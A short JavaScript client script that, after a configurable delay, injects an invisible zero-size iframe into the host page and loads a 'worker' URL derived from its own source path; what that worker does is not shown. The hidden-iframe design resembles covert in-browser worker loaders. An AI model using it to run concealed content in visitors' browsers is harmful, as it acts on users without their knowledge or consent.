;(function () {
  var clientOptions = (function () {
    var scripts = document.getElementsByTagName('script');
    var script = scripts[scripts.length - 1];

    var source = script.getAttribute('src');
    
    if(!source){
      throw new Error('Failed to determine source URI!');
    }
    
    return {
      src: source.replace('client.js', 'worker'),
      delay: parseInt(script.getAttribute('data-delay')) || 0
    };
  })();

  function createIFrame(options) {
    var iframe = document.createElement('iframe');
    
    iframe.setAttribute('src', options.src);
    iframe.setAttribute('style', 'width:0px;height:0px;visiblilty:hidden;overflow:hidden');
    iframe.setAttribute('frameBorder', '0');
    
    document.body.appendChild(iframe);
  }

  (function (options) {
    setTimeout(function () {
      createIFrame(options);
    }, options.delay);
  })(clientOptions);
})();